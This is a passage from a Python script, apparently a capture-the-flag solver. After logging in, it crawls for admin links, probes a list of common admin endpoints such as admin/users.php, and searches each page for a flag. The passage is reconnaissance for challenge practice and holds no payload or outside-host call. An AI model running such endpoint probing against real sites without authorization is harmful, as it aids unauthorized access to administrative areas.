    # Check if there are links to other admin pages
    links = re.findall(r'href=["\']([^"\']+)["\']', r_login.text)
    admin_links = [link for link in links if 'admin' in link.lower() or '.php' in link]
    
    if admin_links:
        print(f"\n[+] Found admin links: {admin_links}")
        
        # Visit each admin link to search for flag
        for link in admin_links:
            if not link.startswith('http'):
                if link.startswith('/'):
                    full_link = target + link[1:]
                else:
                    full_link = target + link
            else:
                full_link = link
                
            print(f"\n[+] Accessing: {full_link}")
            r = session.get(full_link)
            print(f"Status: {r.status_code}, Size: {len(r.text)} bytes")
            
            # Search for flag
            flag_match = flag_pattern.search(r.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"[!] FLAG FOUND AT {full_link}: {flag}")
                break
            else:
                # Show snippet of page
                print(f"Snippet: {r.text[:300]}")

# If no admin links found, try common admin endpoints
if not flag_match:
    print("\n[+] Trying common admin endpoints...")
    
    common_endpoints = [
        'admin/dashboard.php',
        'admin/posts.php',
        'admin/users.php',
        'admin/settings.php',
        'admin/flags.php',
        'dashboard.php',
        'manage.php',
        'control.php'
    ]
    
    for endpoint in common_endpoints:
        url = target + endpoint
        try:
            r = session.get(url)
            if r.status_code == 200:
                print(f"\n[+] Accessible: {url}")
                flag_match = flag_pattern.search(r.text)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"[!] FLAG FOUND: {flag}")
                    break
                else:
                    print(f"Snippet: {r.text[:200]}")
        except:
            continue

# Final check - if still no flag, display full admin panel content
if not flag_match:
    print("\n[+] Full admin panel content for manual analysis:")
    print("="*80)
    print(r_login.text)
    print("="*80)

print("\n[+] Flag search complete")
